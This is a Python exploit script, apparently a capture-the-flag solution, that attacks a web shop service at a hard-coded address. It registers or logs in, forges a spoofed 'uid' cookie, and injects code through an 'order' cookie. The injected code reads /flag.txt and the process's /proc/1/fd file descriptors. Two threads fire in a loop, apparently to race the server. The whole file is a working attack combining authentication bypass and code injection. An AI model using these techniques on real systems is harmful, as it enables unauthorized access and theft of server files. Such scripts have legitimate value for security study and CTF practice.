import time
import requests
import threading

HOST = "65.21.255.24"
PORT = "5002"
USERNAME = 'n0n_exist1ng_user'
PASSWORD = 'password'


def main():
    s = requests.Session()

    print("Logging in...")
    login_response = login(s, USERNAME, PASSWORD)

    if login_response["error"]:
        print(login_response["msg"])

        print("Registering...")
        register_response = register(s, USERNAME, PASSWORD)

        if register_response["error"]:
            print(register_response["msg"])
            return

    uid = s.cookies["uid"]
    passwd = s.cookies["passwd"]
    print(f"uid is {uid}")
    print(f"passwd is {passwd}")

    spoofed_uid = f"0.{uid}e{len(str(uid))}"
    print(f"Spoofing uid as {spoofed_uid}")

    cookies = {
        "uid": spoofed_uid,
        "passwd": passwd
    }

    while True:
        stat = threading.Thread(target=stat_thread, args=(cookies,))
        read = threading.Thread(target=read_thread, args=(cookies,))
        stat.start()
        read.start()
        time.sleep(1.1)


def stat_thread(cookies):
    cookies = cookies.copy()
    cookies["order"] = "a = _=> { return readFile`/flag.txt` + readFile`/flag.txt` + readFile`/flag.txt` + readFile`/flag.txt` + readFile`/flag.txt` + readFile`/flag.txt` + a`` }, a``"
    requests.get(f"http://{HOST}:{PORT}/checkout", cookies=cookies)


def read_thread(cookies):
    cookies = cookies.copy()
    cookies["order"] = "'a', readFile`/proc/1/fd/0`, readFile`/proc/1/fd/1`, readFile`/proc/1/fd/2`, readFile`/proc/1/fd/3`, readFile`/proc/1/fd/4`, readFile`/proc/1/fd/5`, readFile`/proc/1/fd/6`, readFile`/proc/1/fd/7`, readFile`/proc/1/fd/8`, readFile`/proc/1/fd/9`, readFile`/proc/1/fd/10`, readFile`/proc/1/fd/11`, readFile`/proc/1/fd/12`, readFile`/proc/1/fd/13`, readFile`/proc/1/fd/14`, readFile`/proc/1/fd/15`, readFile`/proc/1/fd/16`, readFile`/proc/1/fd/17`, readFile`/proc/1/fd/18`, readFile`/proc/1/fd/19`, readFile`/proc/1/fd/20`, readFile`/proc/1/fd/21`, readFile`/proc/1/fd/22`, readFile`/proc/1/fd/23`, readFile`/proc/1/fd/24`, readFile`/proc/1/fd/25`, readFile`/proc/1/fd/26`, readFile`/proc/1/fd/27`, readFile`/proc/1/fd/28`, readFile`/proc/1/fd/29`, readFile`/proc/1/fd/30`"
    response = requests.get(f"http://{HOST}:{PORT}/checkout", cookies=cookies)
    print(response.text)


def register(s, username, password):
    response = s.post(f"http://{HOST}:{PORT}/register", json={"username": username, "password": password})
    return response.json()


def login(s, username, password):
    response = s.post(f"http://{HOST}:{PORT}/login", json={"username": username, "password": password})
    return response.json()


def buy(s, action, a, b):
    response = s.post(f"http://{HOST}:{PORT}/buy/{action}", json={"a": a, "b": b})
    return response.json()


def checkout(s):
    response = s.get(f"http://{HOST}:{PORT}/checkout")
    return response.text


if __name__ == "__main__":
    main()